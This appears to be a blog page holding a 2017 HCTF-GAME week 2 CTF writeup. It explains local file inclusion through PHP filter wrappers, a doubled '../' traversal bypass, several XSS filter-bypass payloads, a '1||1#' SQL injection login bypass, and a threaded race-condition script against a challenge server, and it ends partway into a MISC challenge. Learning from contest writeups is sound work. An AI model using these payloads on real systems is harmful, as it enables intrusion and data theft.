@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      HCTF-GAME week2 writeup | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="WEB从0开始LFI之0 题目描述： 送分题 flag在../flag.phphttp://119.29.138.57:12000/  没啥好说的，只是为了说下文件包含这个概念 从0开始LFI之1 题目描述： flag在哪呢?http://119.29.138.57:12001/  是接着上一道题的，当包含 ../flag.php，得到提示 flag 不在这，f12 看一下，说是在注释里，既然不在">
+<meta name="keywords" content="writeup,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HCTF-GAME week2 writeup | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2017/01/27/HCTF-GAME-week2-writeup/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="WEB从0开始LFI之0 题目描述： 送分题 flag在../flag.phphttp://119.29.138.57:12000/  没啥好说的，只是为了说下文件包含这个概念 从0开始LFI之1 题目描述： flag在哪呢?http://119.29.138.57:12001/  是接着上一道题的，当包含 ../flag.php，得到提示 flag 不在这，f12 看一下，说是在注释里，既然不在">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HCTF-GAME week2 writeup | HeartSky&#39;s blog">
+<meta name="twitter:description" content="WEB从0开始LFI之0 题目描述： 送分题 flag在../flag.phphttp://119.29.138.57:12000/  没啥好说的，只是为了说下文件包含这个概念 从0开始LFI之1 题目描述： flag在哪呢?http://119.29.138.57:12001/  是接着上一道题的，当包含 ../flag.php，得到提示 flag 不在这，f12 看一下，说是在注释里，既然不在">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">HCTF-GAME week2 writeup</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-01-27" class="post-meta__date date">2017-01-27</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/CTF/">CTF</a>, <a class="tags-link" href="/tags/writeup/">writeup</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="从0开始LFI之0"><a href="#从0开始LFI之0" class="headerlink" title="从0开始LFI之0"></a>从0开始LFI之0</h3><blockquote>
+<p>题目描述： 送分题 flag在../flag.php<br><a href="http://119.29.138.57:12000/" target="_blank" rel="external">http://119.29.138.57:12000/</a></p>
+</blockquote>
+<p>没啥好说的，只是为了说下文件包含这个概念</p>
+<h3 id="从0开始LFI之1"><a href="#从0开始LFI之1" class="headerlink" title="从0开始LFI之1"></a>从0开始LFI之1</h3><blockquote>
+<p>题目描述： flag在哪呢?<br><a href="http://119.29.138.57:12001/" target="_blank" rel="external">http://119.29.138.57:12001/</a></p>
+</blockquote>
+<p>是接着上一道题的，当包含 <code>../flag.php</code>，得到提示 flag 不在这，f12 看一下，说是在注释里，既然不在 HTML 注释里，那就在 PHP 注释里了呗。接下来只要利用 PHP 伪协议读取文件就可以了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show.php?file=php://filter/read=convert.base64-encode/resource=../flag.php</span><br></pre></td></tr></table></figure></p>
+<p>参考文档 : <a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="external">http://php.net/manual/zh/wrappers.php.php</a></p>
+<h3 id="Explorer的图包"><a href="#Explorer的图包" class="headerlink" title="Explorer的图包"></a>Explorer的图包</h3><blockquote>
+<p>题目描述： LoRexxar一直念念不忘Explorer的图包，一气之下Explorer把图放在了服务器上，当LoRexxar又需要的时候可以自己去下。<br>115.28.78.16:13333/6841a43503c4a909484566cdc2850fce/<br>Hint: 1、基本的盲测是发掘漏洞的基本手段<br>2、网站总有一些页面不希望网络爬虫获得</p>
+</blockquote>
+<p>刚开始 binwalk 跑了下有东西，提取出来是本身，以为是循环拆图片 = =<br>后来给了提示之后就很明白了，看下 robots.txt，得到 flag 文件位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /fl1l11l1ag.php</span><br></pre></td></tr></table></figure></p>
+<p>剩下的就是一个很简单的盲测了，抓包可发现只有一个文件下载功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=explorer.jpg</span><br></pre></td></tr></table></figure></p>
+<p>随手试了下找到了图片的位置 <code>images/explorer.jpg</code>，尝试修改为 flag 文件的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=../fl1l11l1ag.php</span><br></pre></td></tr></table></figure></p>
+<p>发现返回的是默认的页面，猜想可能有过滤，回到图片那里，测试了下这几个返回的都是图片<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?f=./explorer.jpg</span><br><span class="line">?f=../explorer.jpg</span><br></pre></td></tr></table></figure></p>
+<p>当再加一个 <code>.</code> 时就又返回了默认页面，结合响应头里的 filename 变成了 <code>.explorer.jpg</code>，这不就很明显是把 <code>../</code> 替换成空格了吗，绕过也简单，双写就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=....//fl1l11l1ag.php</span><br></pre></td></tr></table></figure></p>
+<p>顺便读一下源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line">	$filename = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $_GET[<span class="string">'f'</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(substr($filename, <span class="number">0</span>, <span class="number">1</span>) === <span class="string">'/'</span>) <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	header(<span class="string">'Content-disposition: attachment; filename='</span>.basename($filename));</span><br><span class="line">	$filename = <span class="string">'./images/'</span>.$filename;</span><br><span class="line">	</span><br><span class="line">	readfile($filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> you want explorer<span class="string">'s gallery?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;a href="./index.php?f=explorer.jpg" &gt;click me&lt;/a&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="从0开始之XSS-challenge0"><a href="#从0开始之XSS-challenge0" class="headerlink" title="从0开始之XSS challenge0"></a>从0开始之XSS challenge0</h3><blockquote>
+<p>题目描述： <a href="http://123.206.199.184/xss/0x00/" target="_blank" rel="external">http://123.206.199.184/xss/0x00/</a></p>
+</blockquote>
+<p>只把 <code>script</code> 替换成了空格，n 种方式可以弹窗，给出几个 payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="从0开始之XSS-challenge1"><a href="#从0开始之XSS-challenge1" class="headerlink" title="从0开始之XSS challenge1"></a>从0开始之XSS challenge1</h3><blockquote>
+<p>题目描述： <a href="http://123.206.199.184/xss/0x01/" target="_blank" rel="external">http://123.206.199.184/xss/0x01/</a></p>
+</blockquote>
+<p>过滤了这些<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">script</span><br><span class="line">img</span><br><span class="line">&gt;</span><br><span class="line">(</span><br></pre></td></tr></table></figure></p>
+<p>依然可以绕过<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">" type=image src=1 onerror="alert`1`</span><br><span class="line">" type=image src=1 onerror=alert&amp;#40;1) "</span><br><span class="line">" autofocus onfocus="alert&amp;#40;1)</span><br><span class="line">" type=image onerror=eval&amp;#40;atob&amp;#40;'YWxlcnQoMSk=')) src="1</span><br><span class="line">" type=image src=1 onerror=eval.call`$&#123;'alert\x281)'&#125;` "</span><br></pre></td></tr></table></figure></p>
+<p>涉及以下知识点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input 标签中只有第一个 type 会生效</span><br><span class="line">标签属性值中的 HTML 编码会被自动解码</span><br></pre></td></tr></table></figure></p>
+<h3 id="从0开始之XSS-challenge2"><a href="#从0开始之XSS-challenge2" class="headerlink" title="从0开始之XSS challenge2"></a>从0开始之XSS challenge2</h3><blockquote>
+<p>题目描述： <a href="http://123.206.199.184/xss/0x02/" target="_blank" rel="external">http://123.206.199.184/xss/0x02/</a></p>
+</blockquote>
+<p>过滤了这些<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">"</span><br><span class="line">/</span><br></pre></td></tr></table></figure></p>
+<p>但输出是在 svg 标签内的，在 svg 向量里面，会先进行 xml 解析，所以可构造如下 payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#34;;alert(1);&amp;#34;</span><br><span class="line">&amp;quot;;alert(1)&amp;#47;&amp;#47;</span><br></pre></td></tr></table></figure></p>
+<h2 id="PWNTEST"><a href="#PWNTEST" class="headerlink" title="PWNTEST"></a>PWNTEST</h2><h3 id="我是最简单的渗透题"><a href="#我是最简单的渗透题" class="headerlink" title="我是最简单的渗透题"></a>我是最简单的渗透题</h3><blockquote>
+<p>题目描述： <a href="http://115.28.78.16:13333/pentest/0x01/" target="_blank" rel="external">http://115.28.78.16:13333/pentest/0x01/</a></p>
+</blockquote>
+<p>打开网站后只有一个登录框，其他的什么也没有，大概就是 SQL 注入了，模糊测试后得到绕过方式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>||<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>查询语句大概这样<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query1 = <span class="string">"SELECT * FROM xxx WHERE username = $username and password = $password"</span>;</span><br></pre></td></tr></table></figure></p>
+<h3 id="ez-game"><a href="#ez-game" class="headerlink" title="ez game"></a>ez game</h3><blockquote>
+<p>题目描述： aklis正在线上debug的时候，LoRexxar拔了他的网线，于是…<br><a href="http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/" target="_blank" rel="external">http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/</a></p>
+</blockquote>
+<p>由描述可知应该是备份文件泄露问题，搜下常见的备份文件试一下就知道了，不过开始时 403 了，后来才可以正常下载。这里是 vim 在编辑时的缓冲区备份文件 <code>.*.swp</code>，如果在编辑过程中电脑断电或 vim 发生异常就可以从这个文件恢复<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r .*.swp</span><br></pre></td></tr></table></figure></p>
+<p>然后就得到了 <code>register.php</code> 和 <code>login.php</code> 的源码</p>
+<h5 id="register-php"><a href="#register-php" class="headerlink" title="register.php"></a>register.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> ($_POST[<span class="string">'username'</span>]===<span class="string">''</span> || $_POST[<span class="string">'password'</span>]===<span class="string">''</span> || $_POST[<span class="string">'gogogo'</span>]!==<span class="string">'苟!'</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"something error..."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $mysqli = <span class="keyword">new</span> mysqli(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"gg"</span>.$mysqli-&gt;error);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $username = $mysqli-&gt;escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">  $password = sha1($_POST[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($result = $mysqli-&gt;query(<span class="string">"select * from users where username='$username'"</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows) &#123;</span><br><span class="line">      $result-&gt;close();de</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">"username is exist"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"insert into users (id, username, password) values (NULL , '$username', '$password')"</span>;</span><br><span class="line">  <span class="keyword">if</span> ($mysqli-&gt;query($query) !== <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'gg...'</span>.$mysqli-&gt;error);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"select * from users where username = '$username'"</span>;</span><br><span class="line">  $result = $mysqli-&gt;query($query);</span><br><span class="line">  <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">    $row = $result-&gt;fetch_array();</span><br><span class="line">    $uid = $row[<span class="string">'id'</span>];</span><br><span class="line">    $query = <span class="string">"insert into role (id, uid, level) values (NULL, $uid, 0)"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($mysqli-&gt;query($query) === <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">"success"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">exit</span> (<span class="string">"Oh! No!"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">  header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> ($_POST[<span class="string">'username'</span>]===<span class="string">''</span> || $_POST[<span class="string">'password'</span>]===<span class="string">''</span> || $_POST[<span class="string">'gogogo'</span>]!==<span class="string">'苟!'</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"something error..."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $ocode = intval(trim($_POST[<span class="string">'code'</span>]));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  $mysqli = <span class="keyword">new</span> mysqli(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"gg"</span>.$mysqli-&gt;error);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $username = $mysqli-&gt;escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">  $password = sha1($_POST[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"select * from users where username='$username' and password='$password'"</span>;</span><br><span class="line"></span><br><span class="line">  $result = $mysqli-&gt;query($query);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">    $row = $result-&gt;fetch_array();</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = $row[<span class="string">'id'</span>];</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $row[<span class="string">'username'</span>];</span><br><span class="line">    $query = <span class="string">"select * from role where uid = $_SESSION[id]"</span>;</span><br><span class="line">    $res = $mysqli-&gt;query($query); </span><br><span class="line">    $row = $res ? $res-&gt;fetch_array() : <span class="keyword">array</span>();</span><br><span class="line">    $_SESSION[<span class="string">'level'</span>] = $row[<span class="string">'level'</span>];</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);kanxia</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"Wrong username or password..."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们可以看到 register.php 里第 35 行，用户注册后不仅向 users 表添加了记录，还向 role 表添加了 level 为 0 的记录，虽然暂时不知道干啥的，但出现了肯定是有意义的，再去看下 login.php，第 36 行对 role 表进行了查询，并取出了当前用户的 level，差不多就是这样，然后再去注册登录试下，发现每次登上去都是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you are just guest, you can&apos;t touch flag!</span><br></pre></td></tr></table></figure></p>
+<p>再与源码中出现的 level 相联系，可能是判断的 level，注入是不可能了，我们再看下源码中 level 出现的地方，可以发现用户注册后 level 便被设置为 0，猜测判断代码是这样<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($level === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"you are just guest, you can't touch flag!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>那么我们的目标就是让 level 不为 0 了，看下 login.php 里的与 level 有关的部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select * from role where uid = $_SESSION[id]"</span>;</span><br><span class="line">$res = $mysqli-&gt;query($query); </span><br><span class="line">$row = $res ? $res-&gt;fetch_array() : <span class="keyword">array</span>();</span><br><span class="line">$_SESSION[<span class="string">'level'</span>] = $row[<span class="string">'level'</span>];</span><br></pre></td></tr></table></figure></p>
+<p>看起来好像没什么问题，但第三行，如果表中没有这条记录，便会跳到 array()，那 level 就是 NULL ，这样就能拿到 flag 了。这里就是条件竞争了，大致就是用多个线程同时模拟注册和登录请求，总会有一次在向 role 表添加记录之前完成登陆，附上脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(data)</span>:</span></span><br><span class="line">    r = requests.post(url = <span class="string">"http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/register.php"</span>,data = data)</span><br><span class="line">    <span class="comment"># print r.text</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(data)</span>:</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = s.post(url = <span class="string">"http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/login.php"</span>,data = data)</span><br><span class="line">    r = s.get(url = <span class="string">"http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/index.php"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"hctf"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="comment"># a = "o2a2l1l5a9" + str(i).zfill(3)</span></span><br><span class="line">    a = <span class="string">'aaO0qzxPak'</span> + str(i)</span><br><span class="line">    data = &#123;<span class="string">'username'</span>:a,<span class="string">'password'</span>:a,<span class="string">'gogogo'</span>:<span class="string">'苟!'</span>&#125;</span><br><span class="line"></span><br><span class="line">    threading.Thread(target = register,args = (data,)).start()</span><br><span class="line">    <span class="comment"># time.sleep(0.072)</span></span><br><span class="line">    threading.Thread(target = login,args = (data,)).start()</span><br></pre></td></tr></table></figure></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="explore的奇怪番外2"><a href="#explore的奇怪番外2" class="headerlink" title="explore的奇怪番外2"></a>explore的奇怪番外2</h3><blockquote>
+<p>题目描述： <a href="http://121.42.25.113/io2/io2.html" target="_blank" rel="external">http://121.42.25.113/io2/io2.html</a></p>
+</blockquote>
+<p>连上去之后得到题目要求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Plz give me some data</span><br><span class="line">The data&apos;s len is 100</span><br><span class="line">The data&apos;s sha256 must start with 5b e0 bc</span><br></pre></td></tr></table></figure></p>
